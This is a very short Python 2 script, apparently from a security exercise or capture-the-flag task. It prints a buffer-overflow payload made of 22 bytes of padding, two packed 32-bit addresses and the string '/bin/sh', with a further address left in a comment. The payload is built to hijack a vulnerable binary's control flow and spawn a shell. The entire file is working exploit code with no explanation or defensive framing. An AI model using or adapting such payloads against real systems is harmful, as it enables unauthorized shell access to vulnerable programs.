from shellcode import shellcode
from struct import pack
print 'A'*22+pack("<I",0x08048eed)+pack("<I",0xbffea7f4)+"/bin/sh"
#0x0804a030
